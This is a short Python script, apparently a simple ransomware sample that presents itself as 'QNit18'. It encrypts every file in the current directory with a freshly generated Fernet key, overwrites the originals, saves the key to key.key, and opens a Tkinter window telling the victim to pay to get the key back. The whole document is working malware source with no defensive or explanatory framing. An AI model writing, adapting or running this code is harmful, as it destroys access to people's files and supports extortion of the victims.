import os
import tkinter as tk
from cryptography.fernet import Fernet

allfiles = []
for file in os.listdir():
	if file == "encode.py" or file == "key.key" or file == "decode.py":
		continue
	if os.path.isfile(file):
		allfiles.append(file)
#print(allfiles)

key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
	thekey.write(key)

for file in allfiles:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encr = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encr)

print("All your files has been encrypted")

app = tk.Tk()
app.title("Welcome to QNit18")

label = tk.Label(app, text="Your file has been encrypted by us, please pay to get the key back\n 🤑 🤑 🤑 🤑 🤑 🤑")
label.pack(pady=40, padx=100)

app.mainloop()
